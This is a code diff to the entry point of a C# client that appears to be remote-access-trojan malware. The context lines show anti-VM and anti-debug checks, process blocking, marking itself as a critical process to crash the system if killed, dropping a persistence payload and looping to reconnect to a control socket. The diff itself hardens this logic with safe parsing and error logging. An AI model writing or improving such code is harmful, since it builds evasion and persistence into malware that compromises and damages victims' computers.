@@ -10,7 +10,11 @@ namespace Client
     {
         public static void Main()
         {
-            for (int i = 0; i < Convert.ToInt32(Settings.De_lay); i++)
+            // Safe parsing with fallback
+            if (!int.TryParse(Settings.De_lay, out int delay))
+                delay = 0;
+            
+            for (int i = 0; i < delay; i++)
             {
                 Thread.Sleep(1000);
             }
@@ -19,7 +23,11 @@ namespace Client
 
             try
             {
-                if (Convert.ToBoolean(Settings.An_ti)) //run anti-virtual environment
+                // Safe boolean parsing
+                if (!bool.TryParse(Settings.An_ti, out bool antiEnabled))
+                    antiEnabled = false;
+                
+                if (antiEnabled) //run anti-virtual environment
                 {
                     Anti_Analysis.RunAntiAnalysis();
                     AntiDebug.RunAntiDebug();
@@ -27,11 +35,20 @@ namespace Client
                 }
                 if (!MutexControl.CreateMutex()) //if current payload is a duplicate
                     Environment.Exit(0);
-                if (Convert.ToBoolean(Settings.Anti_Process)) //run AntiProcess
+                
+                if (!bool.TryParse(Settings.Anti_Process, out bool antiProcessEnabled))
+                    antiProcessEnabled = false;
+                if (antiProcessEnabled) //run AntiProcess
                     AntiProcess.StartBlock();
-                if (Convert.ToBoolean(Settings.BS_OD) && Methods.IsAdmin()) //active critical process
+                
+                if (!bool.TryParse(Settings.BS_OD, out bool bsodEnabled))
+                    bsodEnabled = false;
+                if (bsodEnabled && Methods.IsAdmin()) //active critical process
                     ProcessCritical.Set();
-                if (Convert.ToBoolean(Settings.In_stall)) //drop payload [persistence]
+                
+                if (!bool.TryParse(Settings.In_stall, out bool installEnabled))
+                    installEnabled = false;
+                if (installEnabled) //drop payload [persistence]
                     NormalStartup.Install();
                 Methods.PreventSleep(); //prevent pc to idle\sleep
                 
@@ -42,7 +59,10 @@ namespace Client
 
 
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Logger.Error("Program initialization error", ex);
+            }
 
             while (true) // ~ loop to check socket status
             {
@@ -54,7 +74,10 @@ namespace Client
                         ClientSocket.InitializeClient();
                     }
                 }
-                catch { }
+                catch (Exception ex)
+                {
+                    Logger.Warning("Reconnect attempt failed: " + ex.Message);
+                }
                 Thread.Sleep(5000);
             }
         }
